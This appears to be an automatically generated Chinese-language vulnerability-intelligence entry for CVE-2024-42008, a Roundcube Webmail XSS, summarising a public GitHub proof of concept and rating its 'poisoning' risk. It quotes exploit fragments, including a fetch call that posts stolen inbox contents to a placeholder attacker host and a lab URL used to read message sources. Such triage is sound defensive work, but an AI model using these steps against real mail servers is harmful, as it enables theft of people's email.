## CVE-2024-42008-Roundcube-XSS

**漏洞编号:** CVE-2024-42008

**漏洞类型:** 跨站脚本攻击 (XSS)

**影响应用:** Roundcube

**危害等级:** 高危，允许远程攻击者窃取和发送受害者的电子邮件

**影响版本:** <= 1.5.7, 1.6.x <= 1.6.7

**利用条件:** 需要受害者打开包含恶意附件的电子邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-42008 是 Roundcube Webmail 1.5.7 及 1.6.x 到 1.6.7 版本中 `rcmail_action_mail_get->run()` 函数存在的一个跨站脚本 (XSS) 漏洞。

**有效性分析:**

根据漏洞库信息和搜索结果，该漏洞是真实存在的，并且影响了 Roundcube 的多个版本。提供的漏洞利用代码尝试利用此漏洞。

`exploit.js` 脚本从受害者的收件箱中读取前 10 封邮件的内容，并将这些内容 POST 到攻击者的服务器 `meu_ip`。脚本通过修改 `mail.drip.htb` 上的请求来提取邮件内容，并通过 `lerTexto` 函数将内容发送到攻击者的服务器。

`script.py` 脚本将 `exploit.js` 脚本进行 base64 编码，并将其插入到 HTML payload 中。然后，该 payload 被作为电子邮件消息发送给受害者。

**利用方式:**

1.  攻击者构造一个包含恶意 Content-Type header 的电子邮件附件。
2.  受害者打开包含恶意附件的电子邮件。
3.  恶意附件触发 XSS 漏洞，执行 `exploit.js` 代码。
4.  `exploit.js` 代码读取受害者的电子邮件内容并将内容发送到攻击者的服务器。
5. 攻击者可以使用窃取的邮件内容进行进一步攻击，例如窃取凭据或发送钓鱼邮件。

**投毒风险:**

代码中存在一定的投毒风险，分析如下：
1. `script.py` 中的 `ip_atacante = 'CHANGE THIS TO ATTACKERS IP'`  和 `vitima = 'VICTIM EMAIL'` 变量需要用户手动配置，如果用户不小心配置成了错误的 IP 地址，或者使用了漏洞作者提供的IP地址（作者故意引导），那么攻击数据就会发送到攻击者指定的地址，增加了潜在风险。
2. `exploit.js` 中的 `http://mail.drip.htb/?_task=mail&_uid='+id+'&_mbox=INBOX&_action=viewsource&_extwin=1'` 是针对特定的`drip.htb` 域名，这意味着该POC可能是针对特定目标而设计的，而并非通用漏洞利用。
3. `exploit.js` 中的 `fetch('http://meu_ip/',{` 其中的`meu_ip`也需要修改为攻击者的IP地址。
4. 虽然脚本的功能是读取邮件并发送到攻击者的服务器，并没有直接执行恶意代码的部分。但是如果作者控制了接收数据的服务器，则可能存在下一步投毒的可能.

综合来看，投毒风险的概率为10%。主要是配置IP和脚本行为本身的潜在风险，但是可以判断整体风险较低。

**项目地址:** [Foxer131/CVE-2024-42008-9-exploit](https://github.com/Foxer131/CVE-2024-42008-9-exploit)

**漏洞详情:** [CVE-2024-42008](https://nvd.nist.gov/vuln/detail/CVE-2024-42008)